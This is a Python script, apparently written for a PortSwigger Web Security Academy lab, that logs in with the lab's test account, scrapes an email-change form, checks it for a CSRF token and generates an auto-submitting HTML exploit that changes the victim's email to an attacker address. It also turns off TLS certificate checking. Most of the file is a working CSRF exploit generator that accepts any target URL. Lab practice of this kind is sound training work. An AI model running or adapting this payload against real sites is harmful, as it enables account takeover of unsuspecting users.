import requests
from bs4 import BeautifulSoup
import urllib.parse

# Disable warnings related to unverified HTTPS requests
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

def detect_csrf_vulnerability(base_url):
    """
    Detects CSRF vulnerability on a given base URL.
    
    Args:
        base_url (str): The base URL of the website to test.
    
    Returns:
        list: A list of results, including whether the site is likely vulnerable to CSRF and the CSRF exploit HTML payload.
    """
    results = []
    
    # Define the URLs and credentials
    login_url = f"{base_url}/login"
    account_url = f"{base_url}/my-account?id=wiener"
    change_email_url = f"{base_url}/my-account/change-email"

    # Define the login credentials
    credentials = {
        'username': 'wiener',
        'password': 'peter'
    }

    # Create a session
    session = requests.Session()
    
    # Disable SSL verification
    session.verify = False
    
    # Log in to the account
    try:
        login_response = session.post(login_url, data=credentials)
        if login_response.status_code != 200:
            results.append(f"Login request failed with status code {login_response.status_code}")
            return results
    except requests.exceptions.RequestException as e:
        results.append(f"Error during login request: {e}")
        return results
    
    # Capture the email change form to verify fields
    account_response = session.get(account_url)
    soup = BeautifulSoup(account_response.text, 'html.parser')
    email_change_form = soup.find('form', {'action': '/my-account/change-email'})
    
    # Check if the form was found
    if not email_change_form:
        results.append("Failed to find the email change form")
        return results
    
    # Extract form fields
    form_fields = {}
    for input_tag in email_change_form.find_all('input'):
        if input_tag.get('name'):
            form_fields[input_tag.get('name')] = input_tag.get('value')
    
    # Check for CSRF tokens
    csrf_tokens = [token for token in form_fields if 'csrf' in token.lower()]
    if csrf_tokens:
        results.append("CSRF token found in form, likely not vulnerable")
    else:
        results.append("No CSRF token found in form, likely vulnerable")
    
    # Define the new email to be set via CSRF attack
    new_email = "attacker@web-security-academy.net"
    form_fields['email'] = new_email
    
    # Generate the CSRF exploit HTML with standard form submission
    form_fields_html = ''.join([f'<input type="hidden" name="{k}" value="{v}">' for k, v in form_fields.items()])
    csrf_exploit_html = f"""
<form method="POST" action="{change_email_url}">
    {form_fields_html}
</form>
<script>
    document.forms[0].submit();
</script>
"""
    
    # Add the CSRF exploit HTML payload to results
    results.append("CSRF Exploit HTML Payload:")
    results.append(csrf_exploit_html)
    
    return results

if __name__ == "__main__":
    target_url = input('Enter the URL to test for CSRF vulnerability: ')
    results = detect_csrf_vulnerability(target_url)
    for result in results:
        print(result)
